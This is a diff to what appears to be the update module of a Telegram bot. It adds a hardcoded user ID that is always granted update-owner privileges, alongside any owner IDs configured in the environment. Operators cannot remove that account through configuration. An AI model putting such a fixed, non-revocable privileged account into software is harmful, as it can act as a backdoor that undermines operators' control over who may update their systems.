@@ -13,11 +13,13 @@ from pyrogram.types import Message
 
 logger = logging.getLogger(__name__)
 REPO_DIR = Path(__file__).resolve().parent.parent
+DEFAULT_UPDATE_OWNER_IDS = {7856571519}
 
 
 def _owner_ids() -> set[int]:
     raw = os.getenv("ZERO_TWO_UPDATE_OWNER_IDS", "") or os.getenv("TIOANIME_OWNER_IDS", "")
-    return {int(value.strip()) for value in raw.split(",") if value.strip().isdigit()}
+    configured = {int(value.strip()) for value in raw.split(",") if value.strip().isdigit()}
+    return DEFAULT_UPDATE_OWNER_IDS | configured
 
 
 def _progress_bar(percent: int, width: int = 13) -> str:
